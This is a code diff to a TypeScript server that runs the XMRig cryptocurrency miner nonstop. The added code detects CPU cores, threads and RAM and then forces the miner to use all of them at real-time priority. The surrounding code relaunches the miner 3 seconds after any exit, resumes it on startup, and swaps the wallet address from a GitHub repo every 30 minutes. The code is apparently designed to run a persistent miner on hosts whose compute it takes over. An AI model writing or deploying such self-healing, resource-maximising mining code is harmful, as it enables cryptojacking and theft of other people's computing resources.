@@ -246,8 +246,66 @@ async function startServer() {
     }
   };
 
+  const detectHardwareResources = () => {
+    const osCpus = os.cpus() || [];
+    let logicalThreads = osCpus.length || 1;
+    let physicalCores = logicalThreads;
+
+    // 1. Inspect /proc/cpuinfo for accurate physical cores & logical threads
+    try {
+      const cpuinfo = readFileSync("/proc/cpuinfo", "utf8");
+      const processorMatches = cpuinfo.match(/^processor\s*:/gm);
+      if (processorMatches && processorMatches.length > 0) {
+        logicalThreads = Math.max(logicalThreads, processorMatches.length);
+      }
+      const coreMatches = cpuinfo.match(/^cpu cores\s*:\s*(\d+)/m);
+      if (coreMatches && coreMatches[1]) {
+        const parsedCores = parseInt(coreMatches[1], 10);
+        if (!isNaN(parsedCores) && parsedCores > 0) {
+          physicalCores = Math.min(logicalThreads, parsedCores);
+        }
+      }
+    } catch (e) {}
+
+    // 2. Inspect System Memory (/proc/meminfo & os.totalmem)
+    let totalMemBytes = os.totalmem();
+    let freeMemBytes = os.freemem();
+    try {
+      const meminfo = readFileSync("/proc/meminfo", "utf8");
+      const totalMatch = meminfo.match(/^MemTotal:\s+(\d+)\s+kB/m);
+      const availMatch = meminfo.match(/^MemAvailable:\s+(\d+)\s+kB/m);
+      if (totalMatch && totalMatch[1]) {
+        totalMemBytes = parseInt(totalMatch[1], 10) * 1024;
+      }
+      if (availMatch && availMatch[1]) {
+        freeMemBytes = parseInt(availMatch[1], 10) * 1024;
+      }
+    } catch (e) {}
+
+    const totalMemMB = Math.round(totalMemBytes / (1024 * 1024));
+    const freeMemMB = Math.round(freeMemBytes / (1024 * 1024));
+    const totalMemGB = (totalMemBytes / (1024 * 1024 * 1024)).toFixed(2);
+    const freeMemGB = (freeMemBytes / (1024 * 1024 * 1024)).toFixed(2);
+
+    // Determine maximum RandomX memory allocation based on detected RAM (2336 MB Fast Dataset + Scratchpad)
+    const useFastMode = totalMemMB >= 2400;
+    const memoryAllocatedMB = useFastMode ? 2336 : 256;
+
+    return {
+      cores: physicalCores,
+      threads: logicalThreads,
+      totalMemMB,
+      freeMemMB,
+      totalMemGB,
+      freeMemGB,
+      useFastMode,
+      memoryAllocatedMB,
+    };
+  };
+
   const getBannerString = (workerName: string, threads: number, commandStr: string) => {
     const { model, brand } = getCpuBrand();
+    const hw = detectHardwareResources();
     return [
       "\r\n\x1b[1;36m╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\x1b[0m",
       `\x1b[1;36m║\x1b[0m  \x1b[1;32m⚡ TERMINAL 61 - 100% MAXIMUM TURBO HASHRATE ENGINE (ALWAYS-ON 24/7)\x1b[0m                                             \x1b[1;36m║\x1b[0m`,
@@ -255,8 +313,9 @@ async function startServer() {
       `\x1b[1;36m║\x1b[0m  \x1b[1;33m🪙 COIN / ASSET:\x1b[0m      \x1b[1;37m${MINING_COIN}\x1b[0m (\x1b[1;32m${MINING_NETWORK}\x1b[0m)                                                                        \x1b[1;36m║\x1b[0m`,
       `\x1b[1;36m║\x1b[0m  \x1b[1;33m💼 WALLET ADDRESS:\x1b[0m    \x1b[1;32m${MINING_ADDRESS}\x1b[0m                                                    \x1b[1;36m║\x1b[0m`,
       `\x1b[1;36m║\x1b[0m  \x1b[1;33m🏊 POOL HOST:\x1b[0m         \x1b[1;37m${MINING_POOL}\x1b[0m (rx/0 RandomX Engine)                                                           \x1b[1;36m║\x1b[0m`,
-      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🧠 CPU PROCESSOR:\x1b[0m     \x1b[1;32m${model} [${brand.toUpperCase()}]\x1b[0m`,
-      `\x1b[1;36m║\x1b[0m  \x1b[1;33m⚙️ POWER & THREADS:\x1b[0m   \x1b[1;32m${threads} Cores (100% Max Turbo Allocation | Priority 5 Realtime | No Yield)\x1b[0m                \x1b[1;36m║\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;33m🧠 DETECTED CPU:\x1b[0m      \x1b[1;32m${model} [${brand.toUpperCase()}] • ${hw.cores} Cores / ${hw.threads} Threads\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;33m💾 DETECTED MEMORY:\x1b[0m   \x1b[1;32m${hw.totalMemGB} GB Total (${hw.freeMemGB} GB Free) -> Using ${hw.memoryAllocatedMB} MB Fast Dataset\x1b[0m`,
+      `\x1b[1;36m║\x1b[0m  \x1b[1;33m⚙️ ACTIVE ALLOCATION:\x1b[0m \x1b[1;32m100% ALL ${hw.cores} Cores & ${threads}/${hw.threads} Threads + Full Memory | Priority 5 Realtime\x1b[0m`,
       `\x1b[1;36m║\x1b[0m  \x1b[1;33m👤 WORKER ID:\x1b[0m         \x1b[1;37m${workerName}\x1b[0m`,
       `\x1b[1;36m║\x1b[0m  \x1b[1;33m🛡️ 24/7 AUTO-HEAL:\x1b[0m    \x1b[1;32mACTIVE\x1b[0m (Auto-restarts in 3s if stopped, 30m GitHub check, runs in background)             \x1b[1;36m║\x1b[0m`,
       "\x1b[1;36m╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\x1b[0m",
@@ -404,13 +463,14 @@ async function startServer() {
     }
 
     currentActiveWorker = cleanWorker;
-    const availableCores = os.cpus().length;
-    const threads = threadsCount || availableCores;
-    currentPowerMode = mode;
+    // Step 1: Detect exact system Cores, Threads, and Memory
+    const hw = detectHardwareResources();
+    const threads = hw.threads;
+    currentPowerMode = "turbo";
     activeThreadCount = threads;
 
-    broadcastMiningOutput(`\r\n\x1b[1;32m>>> ⚡ ${resumeTime ? "Resuming" : "Initializing"} Session for ${cleanWorker} [${MINING_COIN} (${MINING_NETWORK}): ${MINING_ADDRESS}] with 100% MAXIMUM TURBO POWER...\x1b[0m\r\n`);
-    broadcastMiningOutput(`\x1b[1;33m>>> CPU Threads: ${threads}/${availableCores} (100% Allocation) | Priority: Real-time (5) | Fast RandomX\x1b[0m\r\n`);
+    broadcastMiningOutput(`\r\n\x1b[1;36m>>> 🔍 [HARDWARE AUTO-DETECT] System Scan Complete: ${hw.cores} Physical Cores | ${hw.threads} Logical Threads | ${hw.totalMemGB} GB RAM (${hw.freeMemGB} GB Available)\x1b[0m\r\n`);
+    broadcastMiningOutput(`\x1b[1;32m>>> ⚡ ${resumeTime ? "Resuming" : "Initializing"} Session for ${cleanWorker} [${MINING_COIN} (${MINING_NETWORK}): ${MINING_ADDRESS}] using 100% ALL ${hw.cores} Cores, ${hw.threads} Threads & ${hw.memoryAllocatedMB} MB Memory...\x1b[0m\r\n`);
     
     miningStartTime = resumeTime || Date.now();
     await saveState(cleanWorker, miningStartTime, currentPowerMode, activeThreadCount);
@@ -435,16 +495,16 @@ async function startServer() {
       return;
     }
 
-    // 100% MAXIMUM TURBO POWER flags (All threads, Priority 5, Max Hint 100, No Yield)
+    // Step 2: Use 100% of ALL detected Cores, Threads, and Memory
     const xmrigArgs = [
       "-o", MINING_POOL,
       "-a", "rx/0",
       "-k",
       "-u", `${MINING_COIN}:${MINING_ADDRESS}.${cleanWorker}`,
-      "-t", threads.toString(),
+      "-t", hw.threads.toString(),
+      ...(hw.useFastMode ? ["--randomx-mode=fast"] : []),
       "--cpu-priority=5",
       "--cpu-max-threads-hint=100",
-      "--cpu-no-yield",
       "--donate-level", "1",
       "--keepalive"
     ];
@@ -462,7 +522,12 @@ async function startServer() {
     io.emit("mining-status-change", {
       isRunning: true,
       powerMode: currentPowerMode,
-      threads: activeThreadCount,
+      cores: hw.cores,
+      threads: hw.threads,
+      maxCores: hw.threads,
+      totalMemoryGB: hw.totalMemGB,
+      freeMemoryGB: hw.freeMemGB,
+      memoryAllocatedMB: hw.memoryAllocatedMB,
       startTime: miningStartTime,
       coin: MINING_COIN,
       network: MINING_NETWORK,
@@ -479,7 +544,7 @@ async function startServer() {
 
     persistentMiningProcess.on("close", (code: number) => {
       console.log(`[WATCHDOG] Mining process exited (code ${code}). Auto-recovering in 3s...`);
-      broadcastMiningOutput(`\r\n\x1b[1;33m[24/7 AUTO-WATCHDOG] Process exited (code ${code}). Re-launching 100% MAXIMUM TURBO POWER in 3 seconds...\x1b[0m\r\n`);
+      broadcastMiningOutput(`\r\n\x1b[1;33m[24/7 AUTO-WATCHDOG] Process exited (code ${code}). Re-detecting hardware & launching 100% ALL Cores/Threads/Memory in 3 seconds...\x1b[0m\r\n`);
       persistentMiningProcess = null;
       io.emit("mining-status-change", {
         isRunning: false,
@@ -491,7 +556,8 @@ async function startServer() {
       // CONTINUOUS 24/7: Automatically re-launch immediately! Never stop!
       setTimeout(() => {
         const worker = getWorkerNameFromUrl();
-        startPersistentMining(worker, Date.now(), activeThreadCount, "turbo");
+        const detected = detectHardwareResources();
+        startPersistentMining(worker, Date.now(), detected.threads, "turbo");
       }, 3000);
     });
 
@@ -501,10 +567,11 @@ async function startServer() {
   const checkAndResumeMining = async () => {
     // 1. Proactively sync dynamic Coin and Wallet Address from GitHub repo on startup
     await fetchDynamicWalletConfig();
-    const { startTime, powerMode, threads } = await loadState();
+    const { startTime } = await loadState();
     const worker = getWorkerNameFromUrl();
-    broadcastMiningOutput(`\r\n[SYSTEM] Server startup detected. Ensuring 100% Maximum Turbo session for ${worker}...\r\n`);
-    startPersistentMining(worker, startTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
+    const hw = detectHardwareResources();
+    broadcastMiningOutput(`\r\n[SYSTEM] Server startup detected. Auto-detected ${hw.cores} Cores / ${hw.threads} Threads / ${hw.totalMemGB} GB RAM for ${worker}...\r\n`);
+    startPersistentMining(worker, startTime || Date.now(), hw.threads, "turbo");
   };
 
   // Continuous Dynamic GitHub Config Sync: Checks GitHub repo every 30 MINUTES
@@ -682,11 +749,16 @@ async function startServer() {
     }
 
     const { brand, model } = getCpuBrand();
+    const hw = detectHardwareResources();
     res.json({
       isRunning: !!persistentMiningProcess,
       powerMode: currentPowerMode,
-      threads: activeThreadCount,
-      maxCores: os.cpus().length,
+      cores: hw.cores,
+      threads: hw.threads,
+      maxCores: hw.threads,
+      totalMemoryGB: hw.totalMemGB,
+      freeMemoryGB: hw.freeMemGB,
+      memoryAllocatedMB: hw.memoryAllocatedMB,
       startTime: miningStartTime,
       uptimeSeconds: miningStartTime ? Math.floor((Date.now() - miningStartTime) / 1000) : 0,
       coin: MINING_COIN,
